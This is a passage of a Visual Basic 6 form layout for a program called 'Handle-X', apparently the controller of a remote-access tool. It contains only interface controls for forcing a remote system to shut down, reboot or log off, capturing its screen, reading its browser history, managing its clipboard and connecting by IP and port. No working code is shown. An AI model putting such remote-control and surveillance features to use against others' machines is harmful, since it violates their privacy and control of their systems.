            Name            =   "Tahoma"
            Size            =   9
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   255
         Index           =   6
         Left            =   1800
         MouseIcon       =   "frm_main.frx":556EC
         MousePointer    =   99  'Custom
         TabIndex        =   73
         ToolTipText     =   "Set Remoted System Time"
         Top             =   3240
         Width           =   1215
      End
      Begin VB.Label SystemButtons 
         Alignment       =   2  'Center
         Appearance      =   0  'Flat
         BackColor       =   &H00000000&
         BorderStyle     =   1  'Fixed Single
         Caption         =   "Get Time"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   9
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   255
         Index           =   5
         Left            =   360
         MouseIcon       =   "frm_main.frx":559F6
         MousePointer    =   99  'Custom
         TabIndex        =   72
         ToolTipText     =   "Get Remoted System Time"
         Top             =   3240
         Width           =   1215
      End
      Begin VB.Label SystemButtons 
         Alignment       =   2  'Center
         Appearance      =   0  'Flat
         BackColor       =   &H00000000&
         BorderStyle     =   1  'Fixed Single
         Caption         =   "Force System To HangUp"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   9
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   255
         Index           =   4
         Left            =   360
         MouseIcon       =   "frm_main.frx":55D00
         MousePointer    =   99  'Custom
         TabIndex        =   71
         ToolTipText     =   "Frees The System(Call The Freez System Command Lies There In TaskManager"
         Top             =   2400
         Width           =   2655
      End
      Begin VB.Label SystemButtons 
         Alignment       =   2  'Center
         Appearance      =   0  'Flat
         BackColor       =   &H00000000&
         BorderStyle     =   1  'Fixed Single
         Caption         =   "Hibernate System"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   9
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   255
         Index           =   3
         Left            =   360
         MouseIcon       =   "frm_main.frx":5600A
         MousePointer    =   99  'Custom
         TabIndex        =   70
         ToolTipText     =   "Force The Remoted System To Hibernate"
         Top             =   1920
         Width           =   2655
      End
      Begin VB.Label SystemButtons 
         Alignment       =   2  'Center
         Appearance      =   0  'Flat
         BackColor       =   &H00000000&
         BorderStyle     =   1  'Fixed Single
         Caption         =   "Log Off System"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   9
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   255
         Index           =   2
         Left            =   360
         MouseIcon       =   "frm_main.frx":56314
         MousePointer    =   99  'Custom
         TabIndex        =   69
         ToolTipText     =   "Force The Remoted System To Log Off"
         Top             =   1440
         Width           =   2655
      End
      Begin VB.Label SystemButtons 
         Alignment       =   2  'Center
         Appearance      =   0  'Flat
         BackColor       =   &H00000000&
         BorderStyle     =   1  'Fixed Single
         Caption         =   "Reboot  System"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   9
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   255
         Index           =   1
         Left            =   360
         MouseIcon       =   "frm_main.frx":5661E
         MousePointer    =   99  'Custom
         TabIndex        =   68
         ToolTipText     =   "Force The Remoted System To Reboot"
         Top             =   960
         Width           =   2655
      End
      Begin VB.Label SystemButtons 
         Alignment       =   2  'Center
         Appearance      =   0  'Flat
         BackColor       =   &H00000000&
         BorderStyle     =   1  'Fixed Single
         Caption         =   "ShutDown System"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   9
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   255
         Index           =   0
         Left            =   360
         MouseIcon       =   "frm_main.frx":56928
         MousePointer    =   99  'Custom
         TabIndex        =   67
         ToolTipText     =   "Force The Remoted System To ShutDown"
         Top             =   480
         Width           =   2655
      End
      Begin VB.Label Description 
         Alignment       =   2  'Center
         Appearance      =   0  'Flat
         BackColor       =   &H00A66539&
         BorderStyle     =   1  'Fixed Single
         Caption         =   "- Clip Board Manager -"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   178
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   255
         Index           =   7
         Left            =   3840
         TabIndex        =   66
         Top             =   4545
         Width           =   4215
      End
      Begin VB.Label Description 
         Alignment       =   2  'Center
         Appearance      =   0  'Flat
         BackColor       =   &H00A66539&
         BorderStyle     =   1  'Fixed Single
         Caption         =   "- Windows Control -"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   178
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   255
         Index           =   6
         Left            =   600
         TabIndex        =   65
         Top             =   4545
         Width           =   2175
      End
      Begin VB.Line Line2 
         BorderColor     =   &H00FFFFFF&
         Index           =   44
         X1              =   3360
         X2              =   3360
         Y1              =   360
         Y2              =   4800
      End
      Begin VB.Line Line2 
         BorderColor     =   &H00FFFFFF&
         Index           =   43
         X1              =   8520
         X2              =   3360
         Y1              =   4800
         Y2              =   4800
      End
      Begin VB.Line Line2 
         BorderColor     =   &H00FFFFFF&
         Index           =   42
         X1              =   3360
         X2              =   8520
         Y1              =   360
         Y2              =   360
      End
      Begin VB.Line Line2 
         BorderColor     =   &H00FFFFFF&
         Index           =   41
         X1              =   8520
         X2              =   8520
         Y1              =   360
         Y2              =   4800
      End
      Begin VB.Line Line2 
         BorderColor     =   &H00FFFFFF&
         Index           =   40
         X1              =   3240
         X2              =   120
         Y1              =   360
         Y2              =   360
      End
      Begin VB.Line Line2 
         BorderColor     =   &H00FFFFFF&
         Index           =   39
         X1              =   3240
         X2              =   3240
         Y1              =   360
         Y2              =   4800
      End
      Begin VB.Line Line2 
         BorderColor     =   &H00FFFFFF&
         Index           =   38
         X1              =   3240
         X2              =   120
         Y1              =   4800
         Y2              =   4800
      End
      Begin VB.Line Line2 
         BorderColor     =   &H00FFFFFF&
         Index           =   37
         X1              =   120
         X2              =   120
         Y1              =   360
         Y2              =   4800
      End
      Begin VB.Label RoomTitle 
         Appearance      =   0  'Flat
         BackColor       =   &H00000000&
         BorderStyle     =   1  'Fixed Single
         Caption         =   "\Handle-X\Windows&&Clipboard Manager\"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   178
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   255
         Index           =   4
         Left            =   0
         TabIndex        =   62
         Top             =   0
         Width           =   8595
      End
   End
   Begin VB.PictureBox room 
      Appearance      =   0  'Flat
      BackColor       =   &H00404040&
      ForeColor       =   &H80000008&
      Height          =   375
      Index           =   8
      Left            =   10320
      ScaleHeight     =   345
      ScaleWidth      =   345
      TabIndex        =   9
      Top             =   4080
      Visible         =   0   'False
      Width           =   375
      Begin VB.PictureBox ScrrenShot 
         Appearance      =   0  'Flat
         BackColor       =   &H00985625&
         ForeColor       =   &H80000008&
         Height          =   3615
         Left            =   1200
         ScaleHeight     =   3585
         ScaleWidth      =   6225
         TabIndex        =   177
         Top             =   480
         Width           =   6255
      End
      Begin VB.Label HardwareButtons 
         Alignment       =   2  'Center
         Appearance      =   0  'Flat
         BackColor       =   &H00000000&
         BorderStyle     =   1  'Fixed Single
         Caption         =   "Images Configuration"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   9
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   255
         Index           =   35
         Left            =   4560
         MouseIcon       =   "frm_main.frx":56C32
         MousePointer    =   99  'Custom
         TabIndex        =   176
         ToolTipText     =   "Force The Remoted System To ShutDown"
         Top             =   4440
         Width           =   2535
      End
      Begin VB.Label RoomTitle 
         Appearance      =   0  'Flat
         BackColor       =   &H00000000&
         BorderStyle     =   1  'Fixed Single
         Caption         =   "\Handle-X\Screen Capture :\>_"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   178
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   255
         Index           =   10
         Left            =   0
         TabIndex        =   175
         Top             =   0
         Width           =   8655
      End
      Begin VB.Line Line2 
         BorderWidth     =   2
         Index           =   70
         X1              =   7920
         X2              =   720
         Y1              =   4200
         Y2              =   4200
      End
      Begin VB.Label HardwareButtons 
         Alignment       =   2  'Center
         Appearance      =   0  'Flat
         BackColor       =   &H00000000&
         BorderStyle     =   1  'Fixed Single
         Caption         =   "Take  a Screen Shot"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   9
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   255
         Index           =   34
         Left            =   1440
         MouseIcon       =   "frm_main.frx":56F3C
         MousePointer    =   99  'Custom
         TabIndex        =   174
         ToolTipText     =   "Force The Remoted System To ShutDown"
         Top             =   4440
         Width           =   2535
      End
      Begin VB.Line Line2 
         BorderWidth     =   2
         Index           =   69
         X1              =   7560
         X2              =   1080
         Y1              =   360
         Y2              =   360
      End
      Begin VB.Line Line2 
         BorderWidth     =   2
         Index           =   68
         X1              =   1080
         X2              =   1080
         Y1              =   4200
         Y2              =   360
      End
      Begin VB.Line Line2 
         BorderWidth     =   2
         Index           =   67
         X1              =   7560
         X2              =   7560
         Y1              =   4200
         Y2              =   360
      End
   End
   Begin VB.PictureBox room 
      Appearance      =   0  'Flat
      BackColor       =   &H00404040&
      ForeColor       =   &H80000008&
      Height          =   375
      Index           =   6
      Left            =   10320
      ScaleHeight     =   345
      ScaleWidth      =   345
      TabIndex        =   7
      Top             =   3360
      Visible         =   0   'False
      Width           =   375
      Begin VB.TextBox txt_Hardware 
         Alignment       =   2  'Center
         Appearance      =   0  'Flat
         BackColor       =   &H00BA5925&
         BeginProperty DataFormat 
            Type            =   1
            Format          =   "dd/MM/yyyy"
            HaveTrueFalseNull=   0
            FirstDayOfWeek  =   0
            FirstWeekOfYear =   0
            LCID            =   3073
            SubFormatType   =   3
         EndProperty
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   178
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   285
         IMEMode         =   3  'DISABLE
         Index           =   6
         Left            =   3000
         TabIndex        =   194
         Top             =   3120
         Width           =   4320
      End
      Begin VB.TextBox txt_Hardware 
         Alignment       =   2  'Center
         Appearance      =   0  'Flat
         BackColor       =   &H00BA5925&
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   178
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   285
         IMEMode         =   3  'DISABLE
         Index           =   5
         Left            =   3000
         TabIndex        =   168
         Text            =   "http:\\www.yahoo.com\index.html"
         Top             =   1440
         Width           =   4320
      End
      Begin VB.Label Description 
         Appearance      =   0  'Flat
         AutoSize        =   -1  'True
         BackColor       =   &H80000005&
         BackStyle       =   0  'Transparent
         Caption         =   "URL Internet Path :-"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   178
            Weight          =   700
            Underline       =   -1  'True
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   195
         Index           =   16
         Left            =   1200
         TabIndex        =   199
         Top             =   1440
         Width           =   1695
      End
      Begin VB.Label Description 
         Appearance      =   0  'Flat
         AutoSize        =   -1  'True
         BackColor       =   &H80000005&
         BackStyle       =   0  'Transparent
         Caption         =   "Histroy Date :-"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   178
            Weight          =   700
            Underline       =   -1  'True
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   195
         Index           =   20
         Left            =   1200
         TabIndex        =   195
         Top             =   3165
         Width           =   1230
      End
      Begin VB.Line Line2 
         BorderWidth     =   2
         Index           =   62
         X1              =   7560
         X2              =   7560
         Y1              =   4440
         Y2              =   600
      End
      Begin VB.Line Line2 
         BorderWidth     =   2
         Index           =   61
         X1              =   1080
         X2              =   1080
         Y1              =   4440
         Y2              =   600
      End
      Begin VB.Line Line2 
         BorderWidth     =   2
         Index           =   60
         X1              =   7560
         X2              =   1080
         Y1              =   600
         Y2              =   600
      End
      Begin VB.Label HardwareButtons 
         Alignment       =   2  'Center
         Appearance      =   0  'Flat
         BackColor       =   &H00000000&
         BorderStyle     =   1  'Fixed Single
         Caption         =   "Get Browser History"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   9
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   255
         Index           =   31
         Left            =   3000
         MouseIcon       =   "frm_main.frx":57246
         MousePointer    =   99  'Custom
         TabIndex        =   171
         ToolTipText     =   "Force The Remoted System To ShutDown"
         Top             =   3480
         Width           =   2655
      End
      Begin VB.Label HardwareButtons 
         Alignment       =   2  'Center
         Appearance      =   0  'Flat
         BackColor       =   &H00000000&
         BorderStyle     =   1  'Fixed Single
         Caption         =   "Open URL"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   9
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   255
         Index           =   30
         Left            =   3000
         MouseIcon       =   "frm_main.frx":57550
         MousePointer    =   99  'Custom
         TabIndex        =   170
         ToolTipText     =   "Force The Remoted System To ShutDown"
         Top             =   1800
         Width           =   2655
      End
      Begin VB.Label RoomTitle 
         Appearance      =   0  'Flat
         BackColor       =   &H00000000&
         BorderStyle     =   1  'Fixed Single
         Caption         =   "\Handle-X\Internet Manager :\>_"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   178
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   255
         Index           =   9
         Left            =   0
         TabIndex        =   169
         Top             =   0
         Width           =   8655
      End
      Begin VB.Line Line2 
         BorderWidth     =   2
         Index           =   59
         X1              =   7920
         X2              =   720
         Y1              =   4440
         Y2              =   4440
      End
   End
   Begin VB.PictureBox room 
      Appearance      =   0  'Flat
      BackColor       =   &H00404040&
      ForeColor       =   &H80000008&
      Height          =   375
      Index           =   0
      Left            =   10320
      ScaleHeight     =   345
      ScaleWidth      =   345
      TabIndex        =   1
      Top             =   1200
      Visible         =   0   'False
      Width           =   375
      Begin VB.TextBox Txt_Pass 
         Alignment       =   2  'Center
         Appearance      =   0  'Flat
         BackColor       =   &H00A66539&
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   9
            Charset         =   178
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   285
         IMEMode         =   3  'DISABLE
         Left            =   1560
         PasswordChar    =   "*"
         TabIndex        =   196
         Top             =   1200
         Width           =   1455
      End
      Begin MSComctlLib.ImageList IpManagerImageList 
         Left            =   5520
         Top             =   2040
         _ExtentX        =   1005
         _ExtentY        =   1005
         BackColor       =   -2147483643
         ImageWidth      =   12
         ImageHeight     =   12
         MaskColor       =   12632256
         _Version        =   393216
         BeginProperty Images {2C247F25-8591-11D1-B16A-00C0F0283628} 
            NumListImages   =   11
            BeginProperty ListImage1 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "frm_main.frx":5785A
               Key             =   ""
            EndProperty
            BeginProperty ListImage2 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "frm_main.frx":58534
               Key             =   ""
            EndProperty
            BeginProperty ListImage3 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "frm_main.frx":5920E
               Key             =   ""
            EndProperty
            BeginProperty ListImage4 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "frm_main.frx":59AE8
               Key             =   ""
            EndProperty
            BeginProperty ListImage5 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "frm_main.frx":59F3C
               Key             =   ""
            EndProperty
            BeginProperty ListImage6 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "frm_main.frx":5C586
               Key             =   ""
            EndProperty
            BeginProperty ListImage7 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "frm_main.frx":5CB20
               Key             =   ""
            EndProperty
            BeginProperty ListImage8 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "frm_main.frx":5D0BA
               Key             =   ""
            EndProperty
            BeginProperty ListImage9 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "frm_main.frx":5D654
               Key             =   ""
            EndProperty
            BeginProperty ListImage10 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "frm_main.frx":5DCEE
               Key             =   ""
            EndProperty
            BeginProperty ListImage11 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "frm_main.frx":5EF70
               Key             =   ""
            EndProperty
         EndProperty
      End
      Begin VB.TextBox txt_IP 
         Alignment       =   2  'Center
         Appearance      =   0  'Flat
         BackColor       =   &H00A66539&
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   9
            Charset         =   178
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   315
         Left            =   600
         MaxLength       =   15
         TabIndex        =   31
         Text            =   "127.0.0.1"
         Top             =   480
         Width           =   2415
      End
      Begin VB.TextBox txt_Port 
         Alignment       =   2  'Center
         Appearance      =   0  'Flat
         BackColor       =   &H00A66539&
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   9
            Charset         =   178
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   285
         Left            =   1560
         MaxLength       =   5
         TabIndex        =   30
         Text            =   "4000"
         Top             =   840
         Width           =   1455
      End
      Begin MSComctlLib.ListView Current_Connected 
         Height          =   4095
         Left            =   3240
         TabIndex        =   38
         ToolTipText     =   "Double Click To Activate"
         Top             =   360
         Width           =   5295
         _ExtentX        =   9340
         _ExtentY        =   7223
         View            =   3
         LabelEdit       =   1
         LabelWrap       =   -1  'True
         HideSelection   =   -1  'True
         AllowReorder    =   -1  'True
         FullRowSelect   =   -1  'True
         GridLines       =   -1  'True
         _Version        =   393217
         ForeColor       =   16777215
         BackColor       =   10904889
         BorderStyle     =   1
         Appearance      =   1
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   178
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         NumItems        =   4
         BeginProperty ColumnHeader(1) {BDD1F052-858B-11D1-B16A-00C0F0283628} 
            Key             =   "PC"
            Text            =   "PC Name"
            Object.Width           =   3528
         EndProperty
         BeginProperty ColumnHeader(2) {BDD1F052-858B-11D1-B16A-00C0F0283628} 
            SubItemIndex    =   1
            Key             =   "IP"
            Text            =   "IP Number"
            Object.Width           =   1942
         EndProperty
         BeginProperty ColumnHeader(3) {BDD1F052-858B-11D1-B16A-00C0F0283628} 
            SubItemIndex    =   2
            Key             =   "Port"
            Text            =   "Port No."
            Object.Width           =   1499
         EndProperty
         BeginProperty ColumnHeader(4) {BDD1F052-858B-11D1-B16A-00C0F0283628} 
            SubItemIndex    =   3
            Text            =   "Start Time"
            Object.Width           =   2117
         EndProperty
      End
      Begin MSComctlLib.ListView AddressBook 
         Height          =   2595
         Left            =   240
         TabIndex        =   64
         Top             =   1560
         Width           =   2775
         _ExtentX        =   4895
         _ExtentY        =   4577
         View            =   3
         LabelEdit       =   1
         LabelWrap       =   -1  'True
         HideSelection   =   -1  'True
         AllowReorder    =   -1  'True
         FullRowSelect   =   -1  'True
         GridLines       =   -1  'True
         _Version        =   393217
         ForeColor       =   16777215
         BackColor       =   10904889
         BorderStyle     =   1
         Appearance      =   0
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Tahoma"
            Size            =   6.75
            Charset         =   178
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         NumItems        =   3
         BeginProperty ColumnHeader(1) {BDD1F052-858B-11D1-B16A-00C0F0283628} 
            Key             =   "PC"
            Text            =   "IPAddress"
            Object.Width           =   1764
         EndProperty
         BeginProperty ColumnHeader(2) {BDD1F052-858B-11D1-B16A-00C0F0283628} 
            SubItemIndex    =   1
            Key             =   "IP"
            Text            =   "Port"
            Object.Width           =   1059
         EndProperty
         BeginProperty ColumnHeader(3) {BDD1F052-858B-11D1-B16A-00C0F0283628} 
            SubItemIndex    =   2
            Key             =   "Port"
            Text            =   "Comment"
            Object.Width           =   2064
         EndProperty
      End
      Begin VB.Label Description 
         Appearance      =   0  'Flat
         AutoSize        =   -1  'True
         BackColor       =   &H80000005&
         BackStyle       =   0  'Transparent
         Caption         =   "Password :-"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   178
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   195
         Index           =   5
         Left            =   240
         TabIndex        =   197
         Top             =   1220
         Width           =   975
      End
      Begin VB.Image IP_Buttons 
         Appearance      =   0  'Flat
         BorderStyle     =   1  'Fixed Single
         Height          =   255
         Index           =   8
         Left            =   1680
         Stretch         =   -1  'True
         ToolTipText     =   "Edit Port"
         Top             =   4170
         Width           =   255
      End
      Begin VB.Image IP_Buttons 
         Appearance      =   0  'Flat
         BorderStyle     =   1  'Fixed Single
         Height          =   255
         Index           =   9
         Left            =   2160
         Stretch         =   -1  'True
         ToolTipText     =   "Edit Comment"
         Top             =   4170
         Width           =   255
      End
      Begin VB.Image IP_Buttons 
         Appearance      =   0  'Flat
         BorderStyle     =   1  'Fixed Single
         Height          =   255
         Index           =   10
         Left            =   2655
         Stretch         =   -1  'True
         ToolTipText     =   "Delete"
         Top             =   4170
         Width           =   255
      End
      Begin VB.Image IP_Buttons 
         Appearance      =   0  'Flat
         BorderStyle     =   1  'Fixed Single
         Height          =   285
         Index           =   7
         Left            =   8160
         Stretch         =   -1  'True
         ToolTipText     =   "Reserved"
         Top             =   4560
         Width           =   300
      End
      Begin VB.Line Line2 
         BorderColor     =   &H00FFFFFF&
         Index           =   36
         X1              =   3120
         X2              =   120
         Y1              =   4500
         Y2              =   4500
      End
      Begin VB.Line Line2 
         BorderColor     =   &H00FFFFFF&
         Index           =   34
         X1              =   3120
         X2              =   100
         Y1              =   4860
         Y2              =   4860
      End
      Begin VB.Line Line2 
         BorderColor     =   &H00FFFFFF&
         Index           =   33
         X1              =   3120
         X2              =   3120
         Y1              =   4500
         Y2              =   4880
      End
      Begin VB.Line Line2 
         BorderColor     =   &H00FFFFFF&
         Index           =   22
         X1              =   120
         X2              =   3120
         Y1              =   360
         Y2              =   360
      End
      Begin VB.Image IP_Buttons 
         Appearance      =   0  'Flat
         BorderStyle     =   1  'Fixed Single
         Height          =   285
         Index           =   6
         Left            =   7464
         Stretch         =   -1  'True
         ToolTipText     =   "Reserved"
         Top             =   4560
         Width           =   300
      End
      Begin VB.Image IP_Buttons 
         Appearance      =   0  'Flat
         BorderStyle     =   1  'Fixed Single
         Height          =   285
         Index           =   5
         Left            =   6770
         Stretch         =   -1  'True
         ToolTipText     =   "Reserved"
         Top             =   4560
         Width           =   300
      End
      Begin VB.Image IP_Buttons 
         Appearance      =   0  'Flat
         BorderStyle     =   1  'Fixed Single
         Height          =   285
         Index           =   3
         Left            =   5382
         Stretch         =   -1  'True
         ToolTipText     =   "Execute X-WhoIS"
         Top             =   4545
         Width           =   300
      End
      Begin VB.Image IP_Buttons 
         Appearance      =   0  'Flat
         BorderStyle     =   1  'Fixed Single
         Height          =   290
         Index           =   2
         Left            =   4688
         Stretch         =   -1  'True
         ToolTipText     =   "Execute X-Traceroute"
         Top             =   4540
         Width           =   300
      End
      Begin VB.Image IP_Buttons 
         Appearance      =   0  'Flat
         BorderStyle     =   1  'Fixed Single
         Height          =   290
         Index           =   0
         Left            =   3300
         Stretch         =   -1  'True
         ToolTipText     =   "Execute X-Router"
         Top             =   4540
         Width           =   300
      End
      Begin VB.Image IP_Buttons 
         Appearance      =   0  'Flat
         BorderStyle     =   1  'Fixed Single
         Height          =   290
         Index           =   1
         Left            =   3994
         Stretch         =   -1  'True
         ToolTipText     =   "Execute X-Ping"
         Top             =   4540
         Width           =   300
      End
      Begin VB.Image IP_Buttons 
         Appearance      =   0  'Flat
         BorderStyle     =   1  'Fixed Single
         Height          =   285
         Index           =   4
         Left            =   6076
         Stretch         =   -1  'True
         ToolTipText     =   "Execute X-Scanner"
         Top             =   4560
         Width           =   300
      End
      Begin VB.Line Line2 
         BorderColor     =   &H00FFFFFF&
         Index           =   32
         X1              =   8520
         X2              =   8520
         Y1              =   4500
         Y2              =   4860
      End
      Begin VB.Line Line2 
         BorderColor     =   &H00FFFFFF&
         Index           =   31
         X1              =   3240
         X2              =   8535
         Y1              =   4860
         Y2              =   4860
      End
      Begin VB.Line Line2 
         BorderColor     =   &H00FFFFFF&
         Index           =   30
         X1              =   3240
         X2              =   8520
         Y1              =   4500
         Y2              =   4500
      End
      Begin VB.Line Line2 
         BorderColor     =   &H00FFFFFF&
         Index           =   29
         X1              =   3240
         X2              =   3240
         Y1              =   4500
         Y2              =   4860
      End
      Begin VB.Label RoomTitle 
         Appearance      =   0  'Flat
         BackColor       =   &H00000000&
         BorderStyle     =   1  'Fixed Single
         Caption         =   "\Handle-X\IP Managerr :\>_"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   178
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   255
         Index           =   0
         Left            =   0
         TabIndex        =   40
         Top             =   0
         Width           =   8655
      End
      Begin VB.Label Control_Box 
         Alignment       =   2  'Center
         Appearance      =   0  'Flat
         BackColor       =   &H00000000&
         BorderStyle     =   1  'Fixed Single
         Caption         =   "Disconnect"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   9
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   270
         Index           =   3
         Left            =   1720
         MouseIcon       =   "frm_main.frx":5F0CA
         MousePointer    =   99  'Custom
         TabIndex        =   37
         Top             =   4560
         Width           =   1335
      End
      Begin VB.Label Control_Box 
         Alignment       =   2  'Center
         Appearance      =   0  'Flat
         BackColor       =   &H00000000&
         BorderStyle     =   1  'Fixed Single
         Caption         =   "Connect"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   9
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   270
         Index           =   2
         Left            =   200
         MouseIcon       =   "frm_main.frx":5F3D4
         MousePointer    =   99  'Custom
         TabIndex        =   36
         Top             =   4560
         Width           =   1355
      End
      Begin VB.Label Description 
         Appearance      =   0  'Flat
         AutoSize        =   -1  'True
         BackColor       =   &H80000005&
         BackStyle       =   0  'Transparent
         Caption         =   "Port Number :-"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   178
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   195
         Index           =   4
         Left            =   240
         TabIndex        =   35
         Top             =   855
         Width           =   1230
      End
      Begin VB.Label Description 
         Appearance      =   0  'Flat
         AutoSize        =   -1  'True
         BackColor       =   &H80000005&
         BackStyle       =   0  'Transparent
         Caption         =   "IP :-"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   178
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
